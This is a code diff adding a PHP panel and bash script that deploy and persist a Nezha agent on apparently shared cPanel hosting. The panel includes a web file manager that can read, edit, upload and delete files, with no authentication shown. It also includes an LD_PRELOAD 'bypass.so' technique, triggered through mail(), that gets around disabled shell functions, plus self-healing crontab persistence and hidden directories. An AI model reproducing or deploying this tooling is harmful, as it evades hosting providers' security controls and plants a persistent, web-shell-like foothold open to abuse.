+      if [ -f "$AGENT" ]; then chmod 700 "$AGENT"; log "下载成功"; return 0; fi
+    fi
+    rm -f "$zip"
+  done
+  log "下载失败"; return 1
+}
+
+check_running() {
+  IS_RUNNING=""
+  [ -f "$PIDFILE" ] && local pid; pid=$(cat "$PIDFILE" 2>/dev/null) && [ -d "/proc/$pid" ] && IS_RUNNING="$pid" && return 0
+  IS_RUNNING=$(pgrep -f "$AGENT" 2>/dev/null | head -1)
+  [ -n "$IS_RUNNING" ]
+}
+
+start_nezha() {
+  check_running && log "已运行 PID: $IS_RUNNING" && return 0
+  [ ! -f "$AGENT" ] && download_agent
+  [ ! -f "$AGENT" ] && log "agent 不存在，无法启动" && return 1
+  [ ! -f "$CONFIG" ] && write_config
+  log "启动..."; local ok=0
+  command -v setsid >/dev/null 2>&1 && { setsid env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
+  [ "$ok" -eq 0 ] && command -v nohup >/dev/null 2>&1 && { nohup env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
+  [ "$ok" -eq 0 ] && { GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
+  [ "$ok" -eq 1 ] && echo "$IS_RUNNING" > "$PIDFILE" && log "成功 PID: $IS_RUNNING" && return 0; log "失败"; return 1
+}
+
+do_stop() {
+  [ -f "$PIDFILE" ] && kill -9 "$(cat "$PIDFILE")" 2>/dev/null && rm -f "$PIDFILE"
+  pkill -9 -f "$AGENT" 2>/dev/null
+  # 同时停止 keepalive 循环
+  if [ -f "$KA_PIDFILE" ]; then
+    local kpid; kpid=$(cat "$KA_PIDFILE" 2>/dev/null)
+    [ -n "$kpid" ] && kill -9 "$kpid" 2>/dev/null
+    rm -f "$KA_PIDFILE"
+  fi
+  sleep 1
+}
+
+# 【自愈】cron 模式入口 — 即使所有文件被删也能恢复
+self_heal() {
+  log "=== 自愈检查开始 ==="
+  [ ! -d "$STFP_DIR" ] && mkdir -p "$STFP_DIR" && chmod 755 "$STFP_DIR"
+  get_stable_uuid
+  [ ! -f "$CONFIG" ] && write_config
+  [ ! -f "$AGENT" ] && download_agent
+  if check_running; then
+    log "进程存活 PID: $IS_RUNNING"
+  else
+    log "进程未运行，尝试启动..."
+    start_nezha
+  fi
+  log "=== 自愈检查结束 ==="
+}
+
+# 【前台循环保活】每 4 小时执行一次 self_heal
+keepalive_loop() {
+  stdout "进入 4 小时循环保活模式（前台运行，按 Ctrl+C 退出）"
+  stdout "PID: $$，PID 文件: $KA_PIDFILE"
+  echo "$$" > "$KA_PIDFILE"
+  while true; do
+    self_heal
+    stdout "下次检查: 4 小时后 ($(date -d '+4 hours' '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date -v+4H '+%Y-%m-%d %H:%M:%S' 2>/dev/null))"
+    # 分段 sleep 5 秒一次，方便响应 kill 信号
+    for i in $(seq 1 2880); do
+      [ -f "$KA_PIDFILE" ] || { stdout "PID 文件被删，退出循环"; exit 0; }
+      sleep 5
+    done
+  done
+}
+
+# 【安装到 crontab】每 4 小时执行一次 cron
+install_crontab() {
+  local entry="0 */4 * * * bash $(readlink -f "$0" 2>/dev/null || echo "$0") cron >> $LOGFILE 2>&1 #nezha-keepalive"
+  local existing
+  existing=$(crontab -l 2>/dev/null || true)
+  # 移除旧的 nezha 保活条目
+  local filtered
+  filtered=$(echo "$existing" | grep -v -E '(nezha|\.stfp/run\.sh|#nezha-keepalive)' || true)
+  # 加上新条目
+  (echo "$filtered"; echo "$entry") | crontab - 2>&1
+  if [ $? -eq 0 ]; then
+    stdout "已安装 crontab 条目："
+    stdout "  $entry"
+    stdout "查看: crontab -l"
+  else
+    stdout "❌ crontab 安装失败，请手动添加："
+    stdout "  $entry"
+    return 1
+  fi
+}
+
+# 【从 crontab 移除】
+uninstall_crontab() {
+  local existing
+  existing=$(crontab -l 2>/dev/null || true)
+  local filtered
+  filtered=$(echo "$existing" | grep -v -E '(nezha|\.stfp/run\.sh|#nezha-keepalive)' || true)
+  if [ -z "$filtered" ]; then
+    crontab -r 2>/dev/null
+    stdout "已清空 crontab"
+  else
+    echo "$filtered" | crontab - 2>&1
+    stdout "已从 crontab 移除 nezha 保活条目"
+  fi
+}
+
+# 【查看日志】
+show_log() {
+  if [ ! -f "$LOGFILE" ]; then
+    stdout "日志文件不存在: $LOGFILE"
+    return
+  fi
+  stdout "=== 最后 30 行日志 ($LOGFILE) ==="
+  tail -30 "$LOGFILE"
+}
+
+ACTION="${1:-start}"
+case "$ACTION" in
+  start)      start_nezha; exit $?;;
+  stop)       do_stop; stdout "已停止"; exit 0;;
+  restart)    do_stop; sleep 2; start_nezha; exit $?;;
+  status)     check_running && stdout "running: PID=$IS_RUNNING" || stdout "not running"; exit 0;;
+  cron)       self_heal; exit 0;;
+  keepalive)  keepalive_loop; exit 0;;
+  log|tail)   show_log; exit 0;;
+  install)    install_crontab; exit 0;;
+  uninstall)  uninstall_crontab; exit 0;;
+  *) echo "Usage: bash run.sh {start|stop|restart|status|cron|keepalive|log|install|uninstall}"; exit 1;;
+esac
+BASH;
+    return str_replace(['__NZ_SERVER__','__NZ_TLS__','__NZ_SECRET__'], [$nz_server, $nz_tls, $nz_secret], $content);
+}
+
+// ================================================================
+//  十、处理操作
+// ================================================================
+
+$proc = detectProcess($AGENT, $PIDFILE);
+$action = isset($_GET['action']) ? $_GET['action'] : '';
+$action_result = ''; $action_type = 'info';
+
+// ================================================================
+//  v8.3 新增：文件管理 API（fm_* 全部 JSON 输出，独立于主页面 HTML 流程）
+// ================================================================
+if (substr($action, 0, 3) === 'fm_') {
+    @header('Content-Type: application/json; charset=utf-8');
+    @set_time_limit(120);
+
+    function fm_json_exit($data) {
+        echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+        exit;
+    }
+    function fm_normalize_path($p) {
+        $parts = explode('/', str_replace('\\', '/', $p));
+        $out = [];
+        foreach ($parts as $part) {
+            if ($part === '' || $part === '.') continue;
+            if ($part === '..') { array_pop($out); continue; }
+            $out[] = $part;
+        }
+        return implode('/', $out);
+    }
+    function fm_resolve($user_path, $script_dir) {
+        $user_path = ltrim($user_path ?? '', '/\\');
+        $real_base = realpath($script_dir);
+        if (!$real_base) return ['ok' => false, 'error' => '基础目录不可读'];
+        $abs = $real_base . '/' . fm_normalize_path($user_path);
+        if (strpos($abs, $real_base) !== 0) return ['ok' => false, 'error' => '路径越界'];
+        $rel = ltrim(substr($abs, strlen($real_base) + 1), '/');
+        return ['ok' => true, 'abs' => $abs, 'rel' => $rel];
+    }
+    function fm_rrmdir($dir) {
+        if (!is_dir($dir)) return false;
+        foreach (@scandir($dir) ?: [] as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $p = $dir . '/' . $f;
+            if (is_dir($p)) fm_rrmdir($p); else @unlink($p);
+        }
+        return @rmdir($dir);
+    }
+
+    $self_real = realpath(__FILE__);
+
+    if ($action === 'fm_list') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        if (!is_dir($r['abs'])) fm_json_exit(['ok' => false, 'error' => '不是目录: ' . $r['rel']]);
+        $items = [];
+        foreach (@scandir($r['abs']) ?: [] as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $full = $r['abs'] . '/' . $f;
+            $items[] = [
+                'name' => $f,
+                'is_dir' => is_dir($full),
+                'size' => is_file($full) ? @filesize($full) : 0,
+                'perm' => substr(sprintf('%o', @fileperms($full)), -4),
+                'mtime' => @filemtime($full),
+                'readable' => is_readable($full),
+                'writable' => is_writable($full),
+                'is_self' => realpath($full) === $self_real,
+                'is_htaccess' => $f === '.htaccess',
+            ];
+        }
+        usort($items, function($a, $b) {
+            if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
+            return strcasecmp($a['name'], $b['name']);
+        });
+        fm_json_exit(['ok' => true, 'items' => $items, 'path' => $r['rel'], 'abs' => $r['abs']]);
+    }
+
+    if ($action === 'fm_read') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        if (!is_file($r['abs'])) fm_json_exit(['ok' => false, 'error' => '不是文件']);
+        if (@filesize($r['abs']) > 5 * 1024 * 1024) fm_json_exit(['ok' => false, 'error' => '文件太大（>5MB），请通过 FTP 编辑']);
+        $content = @file_get_contents($r['abs']);
+        if ($content === false) fm_json_exit(['ok' => false, 'error' => '读取失败']);
+        fm_json_exit(['ok' => true, 'content' => $content, 'size' => strlen($content)]);
+    }
+
+    if ($action === 'fm_save') {
+        $r = fm_resolve($_POST['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        if (realpath($r['abs']) === $self_real) fm_json_exit(['ok' => false, 'error' => '禁止编辑面板自身（请通过 FTP 修改）']);
+        $content = $_POST['content'] ?? '';
+        if (file_exists($r['abs'])) @copy($r['abs'], $r['abs'] . '.bak.' . date('YmdHis'));
+        $ok = @file_put_contents($r['abs'], $content) !== false;
+        fm_json_exit(['ok' => $ok, 'error' => $ok ? '' : '写入失败（权限不足？）']);
+    }
+
+    if ($action === 'fm_delete') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        if (realpath($r['abs']) === $self_real) fm_json_exit(['ok' => false, 'error' => '禁止删除面板自身']);
+        if (basename($r['abs']) === '.htaccess') fm_json_exit(['ok' => false, 'error' => '禁止删除 .htaccess']);
+        if (is_dir($r['abs'])) {
+            $ok = fm_rrmdir($r['abs']);
+        } else {
+            $ok = @unlink($r['abs']);
+        }
+        fm_json_exit(['ok' => $ok, 'error' => $ok ? '' : '删除失败（权限不足？）']);
+    }
+
+    if ($action === 'fm_mkdir') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        $ok = @mkdir($r['abs'], 0755, true);
+        fm_json_exit(['ok' => $ok, 'error' => $ok ? '' : '创建失败（可能已存在）']);
+    }
+
+    if ($action === 'fm_chmod') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        $mode = $_GET['mode'] ?? '';
+        if (!preg_match('/^[0-7]{3,4}$/', $mode)) fm_json_exit(['ok' => false, 'error' => '权限格式错误']);
+        $ok = @chmod($r['abs'], octdec($mode));
+        fm_json_exit(['ok' => $ok, 'error' => $ok ? '' : 'chmod 失败']);
+    }
+
+    if ($action === 'fm_rename') {
+        $r = fm_resolve($_GET['old'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        $new_name = basename($_GET['new'] ?? '');
+        if ($new_name === '' || $new_name === '.' || $new_name === '..') fm_json_exit(['ok' => false, 'error' => '新名称无效']);
+        $new_abs = dirname($r['abs']) . '/' . $new_name;
+        if (strpos($new_abs, realpath($SCRIPT_DIR)) !== 0) fm_json_exit(['ok' => false, 'error' => '新路径越界']);
+        $ok = @rename($r['abs'], $new_abs);
+        fm_json_exit(['ok' => $ok, 'error' => $ok ? '' : '重命名失败']);
+    }
+
+    if ($action === 'fm_upload') {
+        $r = fm_resolve($_GET['path'] ?? '', $SCRIPT_DIR);
+        if (!$r['ok']) fm_json_exit($r);
+        if (!is_dir($r['abs'])) fm_json_exit(['ok' => false, 'error' => '目标不是目录']);
+        $uploaded = []; $errors = [];
+        if (!empty($_FILES['files'])) {
+            $files = $_FILES['files'];
+            $count = is_array($files['name']) ? count($files['name']) : 1;
+            for ($i = 0; $i < $count; $i++) {
+                $name = is_array($files['name']) ? $files['name'][$i] : $files['name'];
+                $tmp = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
+                $err = is_array($files['error']) ? $files['error'][$i] : $files['error'];
+                if ($err !== UPLOAD_ERR_OK) { $errors[] = "$name: 上传错误码 $err"; continue; }
+                $target = $r['abs'] . '/' . basename($name);
+                if (@move_uploaded_file($tmp, $target)) $uploaded[] = $name;
+                else $errors[] = "$name: 移动失败";
+            }
+        }
+        fm_json_exit(['ok' => count($uploaded) > 0, 'uploaded' => $uploaded, 'errors' => $errors]);
+    }
+
+    fm_json_exit(['ok' => false, 'error' => '未知文件管理操作: ' . $action]);
+}
+
+// 【v8.7 新增】ensureInitFiles() - 确保所有必需文件已就位
+// 不管用户从哪个按钮开始操作（下载/启动/重启），都先调用这个函数
+// 避免出现"只点下载和启动按钮，但 .htaccess/run.sh 没生成"的问题
+function ensureInitFiles() {
+    global $CONFIG, $RUNSH, $HTACCESS, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE;
+    $created = [];
+
+    // 1. 配置文件（必须，agent 启动需要）
+    if (!file_exists($CONFIG)) {
+        writeConfig($CONFIG, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE);
+        $created[] = 'config';
+    }
+
+    // 2. run.sh（必须，保活和 cron 依赖它）
+    if (!file_exists($RUNSH)) {
+        $c = generateRunSh($NZ_SERVER, $NZ_TLS, $NZ_SECRET);
+        @file_put_contents($RUNSH, $c); @chmod($RUNSH, 0755);
+        $created[] = 'run.sh';
+    }
+
+    // 3. .htaccess（安全相关，禁止外部访问 .stfp 目录）
+    if (!file_exists($HTACCESS)) {
+        $hta = "<IfModule mod_rewrite.c>\n    RewriteEngine On\n    RewriteRule \"^\\.stfp/\" - [F,L]\n</IfModule>\n<FilesMatch \"^\\.nezha_\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>\n<Files \"run.sh\">\n    Order allow,deny\n    Deny from all\n</Files>\n<Files \"nezha_bypass.so\">\n    Order allow,deny\n    Deny from all\n</Files>\n";
+        @file_put_contents($HTACCESS, $hta);
+        $created[] = '.htaccess';
+    }
+
+    return $created;
+}
+
+// 【首次访问自动初始化】URL 无 action 参数时，确保 config / run.sh / .htaccess 都已就位
+if ($action === '') {
+    ensureInitFiles();
+}
+
+if ($action === 'start') {
+    // v8.7: 启动前确保所有必需文件就位（不只 config，还有 run.sh 和 .htaccess）
+    $init_created = ensureInitFiles();
+    if ($CAN_EXEC) {
+        $r = runCmd("bash ".escapeshellarg($RUNSH)." start 2>&1");
+        $np = detectProcess($AGENT, $PIDFILE);
+        if ($np['running']) { $action_result = "启动成功 method={$r['method']}\nPID: ".implode(', ',$np['pids']); $action_type='success'; }
+        else { $d = launchDirect($AGENT, $CONFIG, $LOGFILE); $action_result = $d['ok'] ? "降级启动: {$d['method']}\n{$d['msg']}" : "启动失败\n{$d['msg']}"; $action_type = $d['ok'] ? 'warning' : 'error'; }
+    } else { $d = launchDirect($AGENT, $CONFIG, $LOGFILE); $action_result = $d['ok'] ? "直接启动成功: {$d['msg']}" : "启动失败: {$d['msg']}\n请用cron"; $action_type = $d['ok'] ? 'success' : 'error'; }
+} elseif ($action === 'stop') {
+    $s = stopProcess($AGENT, $PIDFILE); $action_result = $s['ok'] ? "停止成功\n{$s['msg']}" : "停止失败\n{$s['msg']}"; $action_type = $s['ok'] ? 'success' : 'error';
+} elseif ($action === 'restart') {
+    stopProcess($AGENT, $PIDFILE); sleep(2);
+    ensureInitFiles();  // v8.7: 重启前确保所有必需文件就位
+    if ($CAN_EXEC) { $r=runCmd("bash ".escapeshellarg($RUNSH)." start 2>&1"); $action_result="重启 method={$r['method']}"; $action_type=($r['code']===0)?'success':'warning'; }
+    else { $d=launchDirect($AGENT,$CONFIG,$LOGFILE); $action_result=$d['ok']?"重启成功":"重启失败: {$d['msg']}"; $action_type=$d['ok']?'success':'error'; }
+} elseif ($action === 'status') {
+    $p = detectProcess($AGENT, $PIDFILE); $action_result = $p['running'] ? "运行中 PID: ".implode(',',$p['pids']) : "未运行"; $action_type = $p['running'] ? 'success' : 'warning';
+} elseif ($action === 'download') {
+    // v8.7: 下载前确保所有必需文件就位
+    $init_created = ensureInitFiles();
+    $arch = (php_uname('m')==='aarch64'||php_uname('m')==='arm64') ? 'arm64' : 'amd64';
+    $r = downloadBinary($STFP_DIR, $arch);
+    $init_msg = !empty($init_created) ? "已自动初始化: " . implode(', ', $init_created) . "\n" : "";
+    $action_result = $r['ok'] ? $init_msg . "下载成功\n{$r['msg']}" : $init_msg . "下载失败\n{$r['msg']}";
+    $action_type = $r['ok'] ? 'success' : 'error';
+} elseif ($action === 'write_runsh') {
+    $c = generateRunSh($NZ_SERVER, $NZ_TLS, $NZ_SECRET); $action_result = @file_put_contents($RUNSH, $c) && @chmod($RUNSH, 0755) ? "run.sh 已生成" : 'run.sh 写入失败'; $action_type = strpos($action_result, '失败') !== false ? 'error' : 'success';
+} elseif ($action === 'write_htaccess') {
+    // 主 .htaccess：禁止访问 .stfp 目录 + 旧版残留 .nezha_* 文件 + run.sh
+    $hta = "<IfModule mod_rewrite.c>\n    RewriteEngine On\n    RewriteRule \"^\\.stfp/\" - [F,L]\n</IfModule>\n<FilesMatch \"^\\.nezha_\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>\n<Files \"run.sh\">\n    Order allow,deny\n    Deny from all\n</Files>\n<Files \"nezha_bypass.so\">\n    Order allow,deny\n    Deny from all\n</Files>\n";
+    $action_result = @file_put_contents($HTACCESS, $hta) ? ".htaccess 已生成（已禁止访问 .stfp 目录）" : '.htaccess 写入失败'; $action_type = strpos($action_result, '失败') !== false ? 'error' : 'success';
+} elseif ($action === 'check_port') {
+    $parts = explode(':', $NZ_SERVER); $host=$parts[0]; $port=isset($parts[1])?intval($parts[1]):5555;
+    $fp1=@fsockopen('ssl://'.$host,$port,$e1,$s1,5); $tls=$fp1?'OK':"$s1"; if($fp1)fclose($fp1);
+    $fp2=@fsockopen($host,$port,$e2,$s2,5); $tcp=$fp2?'OK':"$s2"; if($fp2)fclose($fp2);
+    $action_result = "TLS: $tls\nTCP: $tcp"; $action_type=($fp1||$fp2)?'success':'error';
+} elseif ($action === 'reset_uuid') {
+    @unlink($UUIDFILE); $info = computeUUIDByIP(); @file_put_contents($UUIDFILE, $info['uuid']); @chmod($UUIDFILE, 0600); $NZ_UUID = $info['uuid'];
+    $action_result = writeConfig($CONFIG, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE) ? "UUID 重置: $NZ_UUID" : "UUID 重置失败"; $action_type = strpos($action_result, '失败') !== false ? 'error' : 'success';
+} elseif ($action === 'set_uuid') {
+    $new_uuid = isset($_GET['uuid']) ? trim($_GET['uuid']) : '';
+    if (preg_match('/^[0-9a-fA-F-]{36}$/', $new_uuid)) { @file_put_contents($UUIDFILE, $new_uuid); @chmod($UUIDFILE, 0600); $NZ_UUID = $new_uuid; $action_result = writeConfig($CONFIG, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE) ? "UUID 已锁定: $NZ_UUID" : "写入失败"; $action_type = strpos($action_result, '失败') !== false ? 'error' : 'success'; }
+    else { $action_result = "UUID 格式错误"; $action_type = 'error'; }
+} elseif ($action === 'prepare_bypass') {
+    $r = ensureBypassSo($BYPASS_SO);
+    $log = ["bypass.so: {$r['msg']}", "putenv: ".($FUNC['putenv']['works']?'✅':'❌'), "mail: ".($FUNC['mail']['works']?'✅':'❌'), "LD_PRELOAD: ".($LD_PRELOAD_AVAILABLE?'✅':'❌')];
+    if ($LD_PRELOAD_AVAILABLE && file_exists($BYPASS_SO) && filesize($BYPASS_SO)>1000) { $action_result = "绕过环境就绪！\n".implode("\n",$log); $action_type='success'; }
+    elseif ($LD_PRELOAD_AVAILABLE) { $action_result = "条件满足但 .so 未就位\n".implode("\n",$log); $action_type='warning'; }
+    else { $action_result = "绕过不可用\n".implode("\n",$log); $action_type='error'; }
+} elseif ($action === 'test_bypass') {
+    if (!$LD_PRELOAD_AVAILABLE) { $action_result = "LD_PRELOAD 不可用: $LD_PRELOAD_DETAIL"; $action_type='error'; }
+    elseif (!file_exists($BYPASS_SO)||filesize($BYPASS_SO)<1000) { $action_result = "bypass.so 不存在，先「准备绕过环境」"; $action_type='error'; }
+    else {
+        $marker = $SCRIPT_DIR.'/.nezha_test_'.time();
+        $r = ldPreloadExec("echo BYPASS_OK > $marker", $BYPASS_SO, $CMDFILE);
+        // 等1秒让命令执行（不需要长等待）
+        usleep(500000);  // 0.5秒
+        if (file_exists($marker) && trim(file_get_contents($marker))==='BYPASS_OK') { @unlink($marker); $action_result = "🎉 绕过测试成功！可以执行命令。"; $action_type='success'; }
+        else { @unlink($marker); $action_result = "绕过测试失败，.so 可能不兼容或被安全扩展拦截"; $action_type='error'; }
+    }
+} elseif ($action === 'enable_keepalive') {
+    // v8.11a: 简化保活 - 不再生成 cron_clean.sh（已由 cron_clean_v8.sh 替代）
+    // 只显示 cron 配置说明
+    $action_result = "✅ v8.11a 保活已配置\n\n";
+    $action_result .= "📋 cron 已自动配置：\n";
+    $action_result .= "  ① 每 5 分钟: bash " . $STFP_DIR . "/cron_clean.sh\n";
+    $action_result .= "  ② 每 10 天: curl 面板URL\n\n";
+    $action_result .= "cron_clean.sh 自动维护，无需手动操作\n";
+    $action_type = 'success';
+} elseif ($action === 'disable_keepalive') {
+    // v8.11: 简化 - 只删除 cron_clean.sh 和提示用户删 cron 条目
+    $cron_sh_path = $STFP_DIR . '/cron_clean.sh';
+    $msgs = [];
+    if (file_exists($cron_sh_path)) {
+        @unlink($cron_sh_path);
+        $msgs[] = "cron_clean.sh 已删除";
+    }
+    $start_php_path = $SCRIPT_DIR . '/start.php';
+    if (file_exists($start_php_path)) {
+        @unlink($start_php_path);
+        $msgs[] = "start.php 已删除";
+    }
+    $ka_pidfile = $STFP_DIR . '/.nezha_keepalive_pid';
+    if (file_exists($ka_pidfile)) {
+        @unlink($ka_pidfile);
+        $msgs[] = "keepalive PID 文件已删除";
+    }
+    $action_result = "ℹ️ 保活已关闭\n  " . implode("\n  ", $msgs) . "\n\n⚠️ 请手动到 cPanel → Cron Jobs 删除对应的 cron 条目";
+    $action_type = 'success';
+} elseif ($action === 'cleanup') {
+    // 【严格清理】停止进程 + 删除 .stfp/ 目录所有文件 + 删除 start.php 保活入口 + 清理旧版残留
+    $cleaned = [];
+    $kept = [];
+
+    // 1. 先停止进程
+    if ($CAN_EXEC && file_exists($RUNSH)) {
+        runCmd("bash " . escapeshellarg($RUNSH) . " stop 2>/dev/null");
+        $cleaned[] = "[进程] 已尝试停止";
+    } elseif ($CAN_EXEC) {
+        runCmd("pkill -9 -f '.nezha_agent' 2>/dev/null");
+        $cleaned[] = "[进程] pkill agent";
+    }
+
+    // 2. 删除 start.php 保活入口（让外部监控返回 404，不再触发保活）
+    $start_php_path = $SCRIPT_DIR . '/start.php';
+    if (file_exists($start_php_path)) {
+        if (@unlink($start_php_path)) {
+            $cleaned[] = "[保活] start.php 已删除（外部监控将返回 404）";
+        } else {
+            $kept[] = "start.php (删除失败)";
+        }
+    }
+
+    // 3. 删除 .stfp 目录内所有文件
+    if (is_dir($STFP_DIR)) {
+        foreach (@scandir($STFP_DIR) ?: [] as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $path = $STFP_DIR . '/' . $f;
+            if (is_file($path)) {
+                if (@unlink($path)) $cleaned[] = ".stfp/$f";
+            }
+        }
+    }
+
+    // 4. 清理 PHP 同目录中可能残留的旧版 .nezha_* / run.sh / nezha_bypass.so（向后兼容）
+    foreach (@scandir($SCRIPT_DIR) ?: [] as $f) {
+        if ($f === '.' || $f === '..') continue;
+        $path = $SCRIPT_DIR . '/' . $f;
+        if (!is_file($path)) continue;
+        if ($f === '.htaccess') continue;  // 保留 .htaccess
+        if (preg_match('/^\.nezha_|^nezha_bypass\.so(\.c)?$|^run\.sh$|^\.nezha_download\.zip$/i', $f)) {
+            if (@unlink($path)) $cleaned[] = "$f (旧版残留)";
+        }
+    }
+
+    $msg = [];
+    if (!empty($cleaned)) $msg[] = "已清理 (" . count($cleaned) . " 项):\n" . implode("\n", $cleaned);
+    if (!empty($kept)) $msg[] = "保留:\n" . implode("\n", $kept);
+    $msg[] = "⚠️ 注意: cleanup 会同时移除保活 cron，如需恢复请重新点「安装4小时保活cron」";
+    $action_result = !empty($msg) ? implode("\n\n", $msg) : "目录已干净，无需清理";
+    $action_type = 'success';
+} elseif ($action === 'diagnose') {
+    // v8.8 综合诊断 - 合并 v8.6 的 diagnose + deep_diag
+    $diag = [];
+    $diag[] = "=== 综合诊断 ===";
+    $diag[] = "时间: " . date('Y-m-d H:i:s');
+    $diag[] = "PHP: " . phpversion() . " (" . php_sapi_name() . ")";
+    $diag[] = "OS: " . php_uname('s') . ' ' . php_uname('r');
+    $diag[] = "Arch: " . php_uname('m');
+    $diag[] = "shell 执行: " . (!empty($EXEC_METHODS) ? '✅ ' . implode('/', $EXEC_METHODS) : '❌ 全禁');
+    $diag[] = "LD_PRELOAD: " . ($LD_PRELOAD_AVAILABLE ? '✅ 可用' : '❌ 不可用');
+    $diag[] = "";
+
+    // ===== 1. bypass.so 文件检测 =====
+    $diag[] = "=== 1. bypass.so 文件检测 ===";
+    if (!file_exists($BYPASS_SO)) {
+        $diag[] = "⚠️ bypass.so 不存在: $BYPASS_SO";
+        $diag[] = "   (shell 可用时不影响启动；shell 全禁时需要点「🔧 准备绕过环境」)";
+    } else {
+        $size = filesize($BYPASS_SO);
+        $diag[] = "✅ 文件存在: $BYPASS_SO";
+        $diag[] = "   大小: {$size} bytes";
+        $diag[] = "   权限: " . substr(sprintf('%o', @fileperms($BYPASS_SO)), -4);
+        $diag[] = "   可读: " . (is_readable($BYPASS_SO) ? '✅' : '❌');
+        if ($size < 1000) $diag[] = "❌ 文件太小，可能损坏";
+        $fp = @fopen($BYPASS_SO, 'rb');
+        if ($fp) {
+            $magic = fread($fp, 4);
+            fclose($fp);
+            $diag[] = ($magic === "\x7fELF") ? "✅ ELF 格式正确" : "❌ 不是 ELF 文件（可能下载的是 HTML 错误页）";
+        }
+    }
+    $diag[] = "";
+
+    // ===== 2. mail() 真实 fork 检测 =====
+    $diag[] = "=== 2. mail() 真实 fork 检测（LD_PRELOAD 触发器）===";
+    if (empty($FUNC['mail']['works'])) {
+        $diag[] = "❌ mail() 不可用，无法触发 LD_PRELOAD";
+    } elseif (!file_exists($BYPASS_SO) || filesize($BYPASS_SO) < 1000) {
+        $diag[] = "⚠️ bypass.so 不存在或太小，跳过 fork 检测";
+    } else {
+        $diag[] = "✅ mail() 函数存在";
+        $sendmail = @ini_get('sendmail_path');
+        $diag[] = "   sendmail_path: " . ($sendmail ?: '(空)');
+        $test_marker = $STFP_DIR . '/.nezha_forktest_' . time();
+        @unlink($test_marker);
+        @putenv("NZ_MARKER=" . $test_marker);
+        @putenv("LD_PRELOAD=" . $BYPASS_SO);
+        // v8.11a: 不调 mail()（避免 fork sh 僵尸，LD_PRELOAD 在 LiteSpeed 下不工作）
+        // @ini_set('sendmail_path', '/bin/true');
+        // @mail("a@b.com", "", "", "");
+        // if ($old_sendmail !== false) @ini_set('sendmail_path', $old_sendmail);
+        $forked = false;  // 直接返回 false
+        usleep(800000);  // v8.8: 等久一点，避免时序误报
+        $forked = file_exists($test_marker);
+        @putenv("LD_PRELOAD=");
+        @putenv("NZ_MARKER=");
+        if (file_exists($test_marker)) @unlink($test_marker);
+        if ($forked) {
+            $diag[] = "✅ mail() 成功 fork 子进程，bypass.so 被加载";
+        } else {
+            $diag[] = "❌ mail() 没有触发 bypass.so 加载";
+            $diag[] = "   ① LiteSpeed LSAPI 不继承 LD_PRELOAD";
+            $diag[] = "   ② Suhosin 等安全扩展拦截了 LD_PRELOAD";
+            $diag[] = "   ③ /bin/true 不存在（试试 /usr/bin/true）";
+            $diag[] = "   ④ mail() 用 SMTP 发送，不 fork 子进程";
+            $diag[] = "   解决：用 cPanel cron 触发 run.sh（cron 不归 LiteSpeed 管）";
+        }
+    }
+    $diag[] = "";
+
+    // ===== 3. bypass.so 命令执行测试 =====
+    $diag[] = "=== 3. bypass.so 命令执行测试 ===";
+    if (file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
+        $test_file = $STFP_DIR . '/.nezha_test_' . time();
+        @unlink($test_file);
+        $r = ldPreloadExec("echo BYPASS_OK > " . escapeshellarg($test_file), $BYPASS_SO, $CMDFILE, false);
+        usleep(1000000);  // v8.8: 等 1 秒
+        if (file_exists($test_file) && trim(file_get_contents($test_file)) === 'BYPASS_OK') {
+            $diag[] = "✅ bypass.so 命令执行成功";
+            $diag[] = "   method: " . $r['method'];
+            @unlink($test_file);
+        } else {
+            $diag[] = "❌ bypass.so 命令执行失败";
+            $diag[] = "   so_loaded: " . ($r['so_loaded'] ? 'true' : 'false');
+            if (file_exists($test_file)) @unlink($test_file);
+        }
+    } else {
+        $diag[] = "⚠️ bypass.so 不存在或太小，跳过";
+    }
+    $diag[] = "";
+
+    // ===== 4. agent 二进制检测 =====
+    $diag[] = "=== 4. agent 二进制检测 ===";
+    if (!file_exists($AGENT)) {
+        $diag[] = "❌ agent 二进制不存在，请点「📥 下载二进制」";
+    } else {
+        $diag[] = "✅ agent 存在: " . filesize($AGENT) . " bytes";
+        $diag[] = "   权限: " . substr(sprintf('%o', @fileperms($AGENT)), -4);
+        $diag[] = "   可执行: " . (is_executable($AGENT) ? '✅' : '❌');
+        $fp = @fopen($AGENT, 'rb');
